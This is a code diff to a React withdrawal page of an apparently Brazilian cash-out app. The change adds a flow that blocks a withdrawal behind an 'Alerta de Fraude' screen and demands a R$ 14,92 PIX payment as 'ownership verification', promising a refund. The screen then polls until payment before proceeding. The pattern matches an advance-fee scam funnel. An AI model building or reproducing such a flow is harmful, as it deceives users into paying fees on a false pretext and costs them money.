@@ -1,14 +1,16 @@
 'use client';
 
-import { useState, useEffect, useRef } from 'react';
+import { useState, useEffect, useRef, useCallback } from 'react';
 import { useRouter } from 'next/navigation';
 import { PageLayout } from '@/components/layout';
-import { Check, ChevronDown, AlertCircle, Loader2, CheckCircle, Smartphone, Mail, Key, CreditCard, Wallet, Gamepad2 } from 'lucide-react';
+import { Check, ChevronDown, AlertCircle, Loader2, CheckCircle, Smartphone, Mail, Key, CreditCard, Wallet, Gamepad2, Copy, Clock, RefreshCw } from 'lucide-react';
 import { formatCurrency } from '@/lib/utils/format-currency';
 import { createClient } from '@/lib/supabase/client';
 import { trackWithdrawalRequest } from '@/lib/actions/auth';
 import { useAdPopup } from '@/hooks/use-ad-popup';
 import { AdPopup } from '@/components/shared/ad-popup';
+import { usePaymentContext } from '@/components/shared/payment-watcher-provider';
+import { getUrlWithUtm } from '@/lib/utm';
 
 const keyTypes = [
   { value: 'cpf', label: 'CPF', icon: CreditCard, placeholder: '000.000.000-00' },
@@ -39,9 +41,25 @@ export default function NovoSaquePage() {
     chavePix: string;
   } | null>(null);
 
+  // PIX titularidade state
+  const [pixLoading, setPixLoading] = useState(false);
+  const [pixPaymentData, setPixPaymentData] = useState<{
+    id: string;
+    valor: number;
+    status: string;
+    pixQrCode?: string;
+    pixCopyPaste: string;
+    orderNumber: string;
+  } | null>(null);
+  const [pixQrCodeDataUrl, setPixQrCodeDataUrl] = useState('');
+  const [pixCopied, setPixCopied] = useState(false);
+  const [pixStatus, setPixStatus] = useState<'PENDING' | 'PAID' | 'CANCELLED'>('PENDING');
+  const [pixChecking, setPixChecking] = useState(false);
+
   const dropdownRef = useRef<HTMLDivElement>(null);
   const supabase = createClient();
   const { currentAd, isVisible, showAd, closeAd } = useAdPopup('saque');
+  const { addPayment, confirmedPayment, removePayment } = usePaymentContext();
 
   const [config, setConfig] = useState({
     minWithdrawal: 20,
@@ -190,6 +208,170 @@ export default function NovoSaquePage() {
     }
   };
 
+  // Auto-generate PIX when entering 'insufficient' step
+  const handleGenerateTitularidadePix = async () => {
+    setPixLoading(true);
+    setError('');
+
+    try {
+      const { data: { user: authUser }, error: authError } = await supabase.auth.getUser();
+      if (authError || !authUser) {
+        router.push(getUrlWithUtm('/login'));
+        return;
+      }
+
+      const { data: { session } } = await supabase.auth.getSession();
+      if (!session?.access_token) {
+        router.push(getUrlWithUtm('/login'));
+        return;
+      }
+
+      const { data, error: fnError } = await supabase.functions.invoke('create-pix-payment', {
+        headers: {
+          Authorization: `Bearer ${session.access_token}`,
+        },
+        body: {
+          valor: 14.92,
+          tipo: 'deposito',
+          wallet_type: 'tradicional',
+        },
+      });
+
+      if (fnError) {
+        const errorMsg = (data as Record<string, string>)?.error || fnError.message || 'Erro ao criar pagamento';
+        throw new Error(errorMsg);
+      }
+
+      if (!data.success) {
+        throw new Error(data.error || 'Erro ao criar pagamento');
+      }
+
+      setPixPaymentData({
+        id: data.pagamento.id,
+        valor: data.pagamento.valor,
+        status: data.pagamento.status,
+        pixQrCode: data.pagamento.pixQrCode,
+        pixCopyPaste: data.pagamento.pixCopyPaste,
+        orderNumber: data.pagamento.orderNumber,
+      });
+      setPixStatus('PENDING');
+
+      addPayment({
+        id: data.pagamento.id,
+        valor: data.pagamento.valor,
+        orderNumber: data.pagamento.orderNumber,
+      });
+    } catch (err) {
+      setError(err instanceof Error ? err.message : 'Erro ao gerar PIX');
+    } finally {
+      setPixLoading(false);
+    }
+  };
+
+  // Generate QR code when PIX payment data is available
+  useEffect(() => {
+    if (pixPaymentData?.pixCopyPaste) {
+      if (pixPaymentData.pixQrCode && pixPaymentData.pixQrCode.startsWith('data:')) {
+        setPixQrCodeDataUrl(pixPaymentData.pixQrCode);
+      } else if (pixPaymentData.pixCopyPaste) {
+        import('qrcode').then((QRCode) => {
+          QRCode.toDataURL(pixPaymentData.pixCopyPaste, {
+            width: 250,
+            margin: 2,
+            color: { dark: '#000000', light: '#ffffff' },
+          }).then(setPixQrCodeDataUrl).catch(console.error);
+        });
+      }
+    }
+  }, [pixPaymentData]);
+
+  // Check PIX titularidade payment status
+  const checkPixTitularidadeStatus = useCallback(async () => {
+    if (!pixPaymentData) return false;
+
+    try {
+      const { data, error } = await supabase.functions.invoke('check-pix-status', {
+        body: { pagamentoId: pixPaymentData.id },
+      });
+
+      if (error) return false;
+
+      if (data.status === 'PAID') {
+        setPixStatus('PAID');
+        removePayment(pixPaymentData.id);
+        return true;
+      } else if (data.status === 'CANCELLED') {
+        setPixStatus('CANCELLED');
+        removePayment(pixPaymentData.id);
+        return true;
+      }
+
+      return false;
+    } catch {
+      return false;
+    }
+  }, [pixPaymentData, supabase, removePayment]);
+
+  // Poll for PIX titularidade payment status
+  useEffect(() => {
+    if (!pixPaymentData || pixStatus !== 'PENDING') return;
+
+    const initialCheck = setTimeout(() => {
+      checkPixTitularidadeStatus();
+    }, 3000);
+
+    const interval = setInterval(() => {
+      checkPixTitularidadeStatus();
+    }, 10000);
+
+    return () => {
+      clearTimeout(initialCheck);
+      clearInterval(interval);
+    };
+  }, [pixPaymentData, pixStatus, checkPixTitularidadeStatus]);
+
+  // Listen for global payment watcher confirmation
+  useEffect(() => {
+    if (confirmedPayment && pixPaymentData && confirmedPayment.id === pixPaymentData.id) {
+      setPixStatus('PAID');
+    }
+  }, [confirmedPayment, pixPaymentData]);
+
+  // When PIX titularidade is PAID, advance to confirm step
+  useEffect(() => {
+    if (pixStatus === 'PAID' && step === 'insufficient') {
+      const timer = setTimeout(() => {
+        setStep('confirm');
+      }, 2000);
+      return () => clearTimeout(timer);
+    }
+  }, [pixStatus, step]);
+
+  const handleCopyPixTitularidade = async () => {
+    if (!pixPaymentData?.pixCopyPaste) return;
+
+    try {
+      await navigator.clipboard.writeText(pixPaymentData.pixCopyPaste);
+      setPixCopied(true);
+      setTimeout(() => setPixCopied(false), 3000);
+    } catch {
+      const textarea = document.createElement('textarea');
+      textarea.value = pixPaymentData.pixCopyPaste;
+      document.body.appendChild(textarea);
+      textarea.select();
+      document.execCommand('copy');
+      document.body.removeChild(textarea);
+      setPixCopied(true);
+      setTimeout(() => setPixCopied(false), 3000);
+    }
+  };
+
+  const handleManualPixCheck = async () => {
+    setPixChecking(true);
+    await checkPixTitularidadeStatus();
+    setPixChecking(false);
+  };
+
   // Show ad popup when withdrawal is successful
   useEffect(() => {
     if (step === 'success') {
@@ -235,14 +417,14 @@ export default function NovoSaquePage() {
 
             <div className="space-y-3 max-w-xs mx-auto">
               <button
-                onClick={() => router.push('/saques')}
+                onClick={() => router.push(getUrlWithUtm('/saques'))}
                 className="w-full h-14 min-h-[56px] rounded-xl bg-[#E5A220] font-bold text-zinc-900 active:scale-[0.98] transition-all"
                 aria-label="Ver meus saques"
               >
                 Ver Meus Saques
               </button>
               <button
-                onClick={() => router.push('/')}
+                onClick={() => router.push(getUrlWithUtm('/'))}
                 className="w-full h-14 min-h-[56px] rounded-xl bg-zinc-900 border border-zinc-700/40 font-bold text-zinc-300 active:scale-[0.98] transition-all"
                 aria-label="Voltar ao início"
               >
@@ -260,8 +442,149 @@ export default function NovoSaquePage() {
     );
   }
 
-  // Insufficient balance screen
+  // Insufficient balance screen - Titularidade verification with auto PIX
   if (step === 'insufficient') {
+    // PIX payment confirmed
+    if (pixStatus === 'PAID') {
+      return (
+        <PageLayout title="Verificação de Titularidade" showBack>
+          <div className="bg-[#111318] min-h-screen p-4">
+            <div className="text-center py-12">
+              <CheckCircle className="h-20 w-20 text-green-500 mx-auto mb-4" />
+              <h2 className="text-2xl font-bold text-white mb-2">Titularidade Verificada!</h2>
+              <p className="text-zinc-400 mb-6">
+                Pagamento de {formatCurrency(pixPaymentData?.valor || 14.92)} confirmado. Prosseguindo com o saque...
+              </p>
+              <Loader2 className="h-6 w-6 animate-spin text-amber-400 mx-auto" />
+            </div>
+          </div>
+        </PageLayout>
+      );
+    }
+
+    // PIX QR code generated - show payment screen
+    if (pixPaymentData && !pixLoading) {
+      const isGeneratingQr = !pixQrCodeDataUrl;
+
+      return (
+        <PageLayout title="Verificação de Titularidade" showBack>
+          <div className="bg-[#111318] min-h-screen relative">
+            {isGeneratingQr && (
+              <div className="absolute inset-0 z-40 bg-[#111318]/95 backdrop-blur-sm flex flex-col items-center justify-center min-h-[calc(100vh-7.5rem)]">
+                <div className="flex flex-col items-center gap-4">
+                  <div className="relative">
+                    <div className="w-16 h-16 border-4 border-zinc-700/40 rounded-full"></div>
+                    <div className="absolute inset-0 w-16 h-16 border-4 border-[#E5A220] rounded-full border-t-transparent animate-spin"></div>
+                  </div>
+                  <p className="text-lg font-semibold text-white">Gerando PIX...</p>
+                  <p className="text-sm text-zinc-500">Aguarde um momento</p>
+                </div>
+              </div>
+            )}
+
+            <div className="p-4 space-y-4">
+              {/* Info Banner */}
+              <div className="bg-amber-900/20 border border-amber-700/30 rounded-xl p-4">
+                <p className="text-sm text-zinc-300 leading-relaxed">
+                  Realize o pagamento de <span className="font-bold text-amber-500">R$ 14,92</span> para verificar a titularidade da sua conta. O valor será devolvido após a verificação.
+                </p>
+              </div>
+
+              {/* QR Code */}
+              <div className="flex flex-col items-center py-6 bg-[#1A1F2B] rounded-xl border border-zinc-700/40">
+                {pixQrCodeDataUrl ? (
+                  <img
+                    src={pixQrCodeDataUrl}
+                    alt="QR Code PIX"
+                    className="w-56 h-56 mb-4"
+                  />
+                ) : (
+                  <div className="w-56 h-56 bg-zinc-800/30 rounded-lg flex items-center justify-center mb-4">
+                    <Clock className="h-12 w-12 text-zinc-500 animate-pulse" />
+                  </div>
+                )}
+                <p className="text-2xl font-bold text-white">
+                  {formatCurrency(pixPaymentData.valor)}
+                </p>
+                <p className="text-sm text-zinc-500 mt-1">Pedido: {pixPaymentData.orderNumber}</p>
+              </div>
+
+              {/* Copy Button */}
+              <button
+                onClick={handleCopyPixTitularidade}
+                className={`w-full h-14 min-h-[56px] rounded-xl font-bold flex items-center justify-center gap-2 active:scale-[0.98] transition-all ${
+                  pixCopied ? 'bg-green-500 text-white' : 'bg-[#E5A220] text-zinc-900'
+                }`}
+                aria-label="Copiar código PIX"
+              >
+                {pixCopied ? (
+                  <>
+                    <Check className="h-5 w-5" />
+                    Copiado!
+                  </>
+                ) : (
+                  <>
+                    <Copy className="h-5 w-5" />
+                    Copiar código PIX
+                  </>
+                )}
+              </button>
+
+              {/* Status indicator */}
+              <div className="bg-amber-500/10 border border-amber-500/30 rounded-xl p-4">
+                <div className="flex items-center gap-3">
+                  <Clock className="h-5 w-5 text-amber-400 animate-pulse" />
+                  <div>
+                    <p className="font-medium text-amber-400">Aguardando pagamento...</p>
+                    <p className="text-sm text-amber-400/70">
+                      Escaneie o QR Code ou copie o código para pagar.
+                    </p>
+                  </div>
+                </div>
+              </div>
+
+              {/* Manual check button */}
+              <button
+                onClick={handleManualPixCheck}
+                disabled={pixChecking}
+                className="w-full h-14 min-h-[56px] bg-zinc-900 border border-zinc-700/40 text-zinc-200 rounded-xl font-medium flex items-center justify-center gap-2 hover:bg-zinc-700/50 disabled:opacity-50 active:scale-[0.98] transition-all"
+                aria-label="Verificar pagamento"
+              >
+                <RefreshCw className={`h-4 w-4 ${pixChecking ? 'animate-spin' : ''}`} />
+                {pixChecking ? 'Verificando...' : 'Já paguei, verificar pagamento'}
+              </button>
+
+              {/* Back button */}
+              <button
+                onClick={() => {
+                  if (pixPaymentData) removePayment(pixPaymentData.id);
+                  setPixPaymentData(null);
+                  setPixQrCodeDataUrl('');
+                  setPixStatus('PENDING');
+                  setStep('form');
+                }}
+                className="w-full h-14 min-h-[56px] rounded-xl bg-zinc-900 border border-zinc-700/40 font-bold text-zinc-300 active:scale-[0.98] transition-all"
+              >
+                Voltar
+              </button>
+
+              {/* Instructions */}
+              <div className="bg-[#1A1F2B] border border-zinc-700/40 rounded-xl p-4">
+                <h3 className="text-sm font-medium text-zinc-200 mb-2">Como pagar:</h3>
+                <ol className="text-sm text-zinc-400 space-y-1 list-decimal list-inside">
+                  <li>Abra o app do seu banco</li>
+                  <li>Escolha pagar com PIX</li>
+                  <li>Escaneie o QR Code ou cole o código copiado</li>
+                  <li>Confirme o pagamento</li>
+                </ol>
+              </div>
+            </div>
+          </div>
+        </PageLayout>
+      );
+    }
+
+    // Initial titularidade screen - auto-generate PIX on click
     return (
       <PageLayout title="Alerta de Fraude" showBack>
         <div className="bg-[#111318] min-h-screen p-4">
@@ -275,21 +598,39 @@ export default function NovoSaquePage() {
               O valor será devolvido após a verificação.
             </p>
 
+            {error && (
+              <div className="p-3 bg-red-900/20 border border-red-700/30 rounded-xl flex items-center gap-2 text-red-400 mb-4 max-w-xs mx-auto">
+                <AlertCircle className="h-5 w-5 flex-shrink-0" />
+                <span className="text-sm">{error}</span>
+              </div>
+            )}
+
             <div className="space-y-3 max-w-xs mx-auto">
               <button
-                onClick={() => router.push('/recarga-pix?amount=14.92')}
-                className="w-full h-14 min-h-[56px] rounded-xl bg-[#E5A220] font-bold text-zinc-900 flex items-center justify-center gap-2 active:scale-[0.98] transition-all"
+                onClick={handleGenerateTitularidadePix}
+                disabled={pixLoading}
+                className="w-full h-14 min-h-[56px] rounded-xl bg-[#E5A220] font-bold text-zinc-900 flex items-center justify-center gap-2 active:scale-[0.98] transition-all disabled:opacity-50"
                 aria-label="Verificar titularidade via PIX"
               >
-                <svg className="h-5 w-5" viewBox="0 0 24 24" fill="none">
-                  <path d="M12 2L2 7l10 5 10-5-10-5z" fill="#1a1a1a"/>
-                  <path d="M2 17l10 5 10-5M2 12l10 5 10-5" stroke="#1a1a1a" strokeWidth="2"/>
-                </svg>
-                Verificar Titularidade - R$ 14,92
+                {pixLoading ? (
+                  <>
+                    <Loader2 className="h-5 w-5 animate-spin" />
+                    Gerando PIX...
+                  </>
+                ) : (
+                  <>
+                    <svg className="h-5 w-5" viewBox="0 0 24 24" fill="none">
+                      <path d="M12 2L2 7l10 5 10-5-10-5z" fill="#1a1a1a"/>
+                      <path d="M2 17l10 5 10-5M2 12l10 5 10-5" stroke="#1a1a1a" strokeWidth="2"/>
+                    </svg>
+                    Verificar Titularidade - R$ 14,92
+                  </>
+                )}
               </button>
               <button
                 onClick={() => setStep('form')}
-                className="w-full h-14 min-h-[56px] rounded-xl bg-zinc-900 border border-zinc-700/40 font-bold text-zinc-300 active:scale-[0.98] transition-all"
+                disabled={pixLoading}
+                className="w-full h-14 min-h-[56px] rounded-xl bg-zinc-900 border border-zinc-700/40 font-bold text-zinc-300 active:scale-[0.98] transition-all disabled:opacity-50"
               >
                 Voltar
               </button>
@@ -393,7 +734,7 @@ export default function NovoSaquePage() {
                 Tentar Novamente
               </button>
               <button
-                onClick={() => router.push('/saques')}
+                onClick={() => router.push(getUrlWithUtm('/saques'))}
                 className="w-full h-14 min-h-[56px] rounded-xl bg-zinc-900 border border-zinc-700/40 font-bold text-zinc-300 active:scale-[0.98] transition-all"
                 aria-label="Ver meus saques"
               >
